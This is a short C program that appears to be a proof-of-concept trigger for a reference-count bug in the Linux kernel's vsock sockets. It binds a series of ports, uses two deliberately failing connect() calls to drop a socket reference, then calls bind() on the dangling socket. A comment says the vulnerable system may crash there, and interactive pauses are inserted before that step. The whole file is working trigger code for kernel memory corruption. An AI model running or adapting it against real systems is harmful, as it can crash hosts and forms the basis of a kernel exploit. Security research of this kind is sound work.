#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/kernel.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>

#define MAX_PORT_RETRIES	24	/* net/vmw_vsock/af_vsock.c */
#define VMADDR_CID_NONEXISTING	42

/* Create socket <type>, bind to <cid, port> and return the file descriptor. */
int vsock_bind(unsigned int cid, unsigned int port, int type)
{
	struct sockaddr_vm sa = {
		.svm_family = AF_VSOCK,
		.svm_cid = cid,
		.svm_port = port,
	};
	int fd;

	fd = socket(AF_VSOCK, type, 0);
	if (fd < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa))) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	return fd;
}

/* Test attempts to trigger a transport release for an unbound socket. This can
 * lead to a reference count mishandling.
 */

int main(void) {

	int sockets[MAX_PORT_RETRIES];
	struct sockaddr_vm addr;
	int s, i, alen;

	s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);

	alen = sizeof(addr);
	if (getsockname(s, (struct sockaddr *)&addr, &alen)) {
		perror("getsockname");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < MAX_PORT_RETRIES; ++i)
		sockets[i] = vsock_bind(VMADDR_CID_ANY, ++addr.svm_port,
					SOCK_SEQPACKET);

	close(s);

    // wait for input
    puts("Setup Finished...");
    getchar();

	s = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (s < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if (!connect(s, (struct sockaddr *)&addr, alen)) {
		fprintf(stderr, "Unexpected connect() #1 success\n");
		exit(EXIT_FAILURE);
	}
	// connect() #1 failed: transport set, sk in unbound list.

	addr.svm_cid = VMADDR_CID_NONEXISTING;
    addr.svm_port = VMADDR_PORT_ANY;
	if (!connect(s, (struct sockaddr *)&addr, alen)) {
		fprintf(stderr, "Unexpected connect() #2 success\n");
		exit(EXIT_FAILURE);
	}
	// connect() #2 failed: transport unset, sk ref dropped?

    // wait for input
    puts("Press for Crash...");
    getchar();

	// Vulnerable system may crash now. [USE THE DANGLING POINTER]
	bind(s, (struct sockaddr *)&addr, alen);

    // wait for input
    getchar();

	close(s);
	while (i--)
		close(sockets[i]);

}
